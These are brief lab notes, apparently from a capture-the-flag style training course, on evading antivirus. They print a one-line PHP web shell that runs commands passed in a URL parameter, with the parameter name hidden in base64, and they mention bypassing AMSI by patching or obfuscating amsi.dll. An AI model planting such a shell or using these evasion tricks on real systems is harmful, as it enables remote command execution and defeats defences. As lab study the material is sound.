Let's 1st try what we have learnt in wreath network and if it doesn't work will learn what they are teaching us.

Let's try this obfuscation
https://www.gaijin.at/en/tools/php-obfuscator
```
<?php system($_GET[base64_decode('Y21k')]);?>
```


As i was going through this Php obfuscation won't work so will have to learn something on the lines of either updating amsi.dll or obfuscate it aka AMSIception.
